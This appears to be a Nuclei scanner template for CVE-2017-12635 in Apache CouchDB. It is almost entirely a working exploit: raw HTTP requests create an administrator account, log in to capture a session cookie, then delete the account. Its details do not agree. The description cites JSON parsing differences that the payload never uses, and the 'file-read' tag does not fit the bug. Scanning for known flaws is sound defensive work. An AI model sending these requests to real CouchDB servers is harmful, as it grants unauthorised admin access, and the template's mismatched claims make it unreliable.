id: cve-2017-12635
info:
  name: Apache CouchDB Administrator Privilege Escalation
  author: ProjectDiscoveryAI
  severity: high
  description: |
    Due to the different parsing methods of JSON between Erlang and JavaScript, this vulnerability allows any user to create an administrator in CouchDB.
  tags: file-read
  reference:
    - https://couchdb.apache.org/
    - https://www.wangan.com/docs/294
  classification:
    cve-id: CVE-2017-12635
    cvss-score: 7.0

variables:
  user: "{{rand_base(8)}}"

http:
  - id: "1"
    raw:
      - |
        PUT /_users/org.couchdb.user:{{user}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        Content-Length: {{len('{"type":"user","name":"{{user}}","roles":["_admin"],"password":"CouchDB"}')}}

        {"type":"user","name":"{{user}}","roles":["_admin"],"password":"CouchDB"}
    matchers:
      - type: word
        words:
          - '"ok":true'
        part: body
      - type: status
        status:
          - 201
    extractors:
      - type: regex
        name: rev
        group: 1
        regex:
          - '"rev":"(.*?)"'
        internal: true

  - id: "2"
    raw:
      - |
        POST /_session HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Content-Length: {{len('name={{user}}&password=CouchDB')}}

        name={{user}}&password=CouchDB
    matchers:
      - type: status
        status:
          - 200
    extractors:
      - type: regex
        name: authsession
        group: 1
        regex:
          - 'AuthSession=(.*?);'
        internal: true

  - id: "3"
    raw:
      - |
        DELETE /_users/org.couchdb.user:{{user}}?rev={{rev}} HTTP/1.1
        Host: {{Hostname}}
        Cookie: AuthSession={{authsession}}
    matchers:
      - type: status
        status:
          - 200
